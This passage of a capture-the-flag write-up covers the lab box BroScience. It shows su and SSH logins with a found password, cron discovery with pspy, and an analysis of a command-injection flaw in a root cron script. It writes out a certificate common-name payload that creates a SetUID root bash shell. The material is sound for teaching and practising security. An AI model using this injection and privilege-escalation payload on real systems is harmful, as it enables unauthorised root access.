
### su / SSH

bill is a user on the box, and the list above has a password for bill. Running `su` with that password works to get a shell as bill:

```

www-data@broscience:/var/www/html$ su - bill       
Password: 
bill@broscience:~$

```

And gives access to `user.txt`:

```

bill@broscience:~$ cat user.txt
511395d5************************

```

The password also works for SSH:

```

oxdf@hacky$ sshpass -p 'iluvhorsesandgym' ssh bill@broscience.htb
Linux broscience 5.10.0-20-amd64 #1 SMP Debian 5.10.158-2 (2022-12-13) x86_64
...[snip]...
bill@broscience:~$

```

## Shell as root

### Enumeration

#### Filesystem

There’s not much else on this box to look at. bill’s home directory is basically empty. Another review of the web code doesn’t give much.

bill cannot run `sudo`:

```

bill@broscience:~$ sudo -l
[sudo] password for bill: 
Sorry, user bill may not run sudo on broscience.

```

I don’t see any unusual SetUID / SetGID binaries.

#### Processes

Turning to the running processes, `ps auxww` doesn’t reveal anything too interesting. I’ll upload [pspy](https://github.com/DominicBreuker/pspy) to look for crons that might be running:

```

oxdf@hacky$ sshpass -p 'iluvhorsesandgym' scp /opt/pspy64 bill@broscience.htb:/dev/shm/pspy

```

It looks like every two minutes there’s a `cron.sh` script that runs as root (UID=0):

```

2023/03/31 08:14:01 CMD: UID=0     PID=298411 | /usr/sbin/CRON -f 
2023/03/31 08:14:01 CMD: UID=0     PID=298412 | /usr/sbin/CRON -f 
2023/03/31 08:14:01 CMD: UID=0     PID=298413 | /bin/sh -c /root/cron.sh 
2023/03/31 08:14:01 CMD: UID=0     PID=298414 | /bin/bash /root/cron.sh 
2023/03/31 08:14:01 CMD: UID=0     PID=298415 | /bin/bash -c /opt/renew_cert.sh /home/bill/Certs/broscience.crt 
2023/03/31 08:14:01 CMD: UID=0     PID=298416 | 
2023/03/31 08:14:01 CMD: UID=0     PID=298417 | /bin/bash /root/cron.sh 

```

It seems to run `/opt/renew_cert.sh` on `/home/bill/Certs/broscience.crt`. The `Certs` directory does exist in bill’s home directory, but it’s empty.

#### renew\_cert.sh

This shell script starts by checking the usage and running help if necessary:

```

#!/bin/bash    
                                           
if [ "$#" -ne 1 ] || [ $1 == "-h" ] || [ $1 == "--help" ] || [ $1 == "help" ]; then
    echo "Usage: $0 certificate.crt";
    exit 0;                                                                            
fi  

```

Then there’s a check that the argument is a file that exists (`[ -f $1 ]`), and if not, it prints a message and exits. When it is a file, it runs `openssl` on the file:

```

    openssl x509 -in $1 -noout -checkend 86400 > /dev/null

    if [ $? -eq 0 ]; then
        echo "No need to renew yet.";
        exit 1;
    fi

```

If the input certificate expires in more than 86400 seconds (a day), it will return 0. If it retires sooner than that (or if there’s bad input), it will return 1, and continue. [This article](https://megamorf.gitlab.io/2019/07/01/check-if-certificate-file-expires-in-n-days/) shows this in practice.

On continuing, the script will parse out variables from the existing certificate:

```

    subject=$(openssl x509 -in $1 -noout -subject | cut -d "=" -f2-)

    country=$(echo $subject | grep -Eo 'C = .{2}')
    state=$(echo $subject | grep -Eo 'ST = .*,')
    locality=$(echo $subject | grep -Eo 'L = .*,')
    organization=$(echo $subject | grep -Eo 'O = .*,')
    organizationUnit=$(echo $subject | grep -Eo 'OU = .*,')
    commonName=$(echo $subject | grep -Eo 'CN = .*,?')       
    emailAddress=$(openssl x509 -in $1 -noout -email)
                                           
    country=${country:4}                                                               
    state=$(echo ${state:5} | awk -F, '{print $1}')         
    locality=$(echo ${locality:3} | awk -F, '{print $1}')
    organization=$(echo ${organization:4} | awk -F, '{print $1}')
    organizationUnit=$(echo ${organizationUnit:5} | awk -F, '{print $1}')
    commonName=$(echo ${commonName:5} | awk -F, '{print $1}')

```

After printing all of this to the screen, it will use it to generate a new certificate:

```

    echo -e "\nGenerating certificate...";
    openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /tmp/temp.key -out /tmp/temp.crt -days 365 <<<"$country        
    $state
    $locality            
    $organization
    $organizationUnit
    $commonName
    $emailAddress
    " 2>/dev/null

    /bin/bash -c "mv /tmp/temp.crt /home/bill/Certs/$commonName.crt"

```

### Command Injection

#### Strategy

The very last line above is the important one. There is a command injection vulnerability in that line if I can control `$commonName`. Working backwards, `$commonName` is set here:

```

commonName=$(echo ${commonName:5} | awk -F, '{print $1}')

```

This is printing whatever `$commonName` was set as, starting from the sixth character, and then printing up to the first `,`.

Before that, `$commonName` is set based on `$subject`:

```

commonName=$(echo $subject | grep -Eo 'CN = .*,?')

```

I believe the author is trying to get from `CN =` up through the next comma or the end of the line, but the way this regex is written, because `.*` is greedy, it will just always take through the end of the line. For example:

```

bill@broscience:~$ echo "this is a test, more stuff" | grep -Eo '.*,?'
this is a test, more stuff

```

`$subject` comes from an `openssl` command output reading the certificate:

```

subject=$(openssl x509 -in $1 -noout -subject | cut -d "=" -f2-)

```

Effectively, if I can put a command injection payload into a certificate, and have it expire in less than one day, this script will execute it.

#### Execute

ChatGPT will quickly give me the `openssl` syntax to make a certificate. I’ll modify it slightly to meet my needs:

```

bill@broscience:~$ openssl req -x509 -nodes -newkey rsa:2048 -keyout /dev/null -out Certs/broscience.crt -days 1
Generating a RSA private key
......................................................+++++
......................+++++
writing new private key to '/dev/null'
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:$(cp /bin/bash /tmp/0xdf; chmod 4777 /tmp/0xdf)                    
Email Address []:

```

My payload will copy `bash` into `/tmp` and set it as SetUID to run as root (I originally tried `/dev/shm`, but it is mounted `nosuid`.

After two minutes, there’s a SetUID binary in `/tmp`:

```

bill@broscience:~$ ls -l /tmp/0xdf
-rwsrwxrwx 1 root root 1234376 Mar 31 09:22 /tmp/0xdf

```

I’ll run that with `-p` to [not drop privs](/2022/05/31/setuid-rabbithole.html) and get a shell as root:

```

bill@broscience:~$ /tmp/0xdf -p
0xdf-5.1#

```

And read the flag:

```

0xdf-5.1# cat root.txt
e810aba4************************

```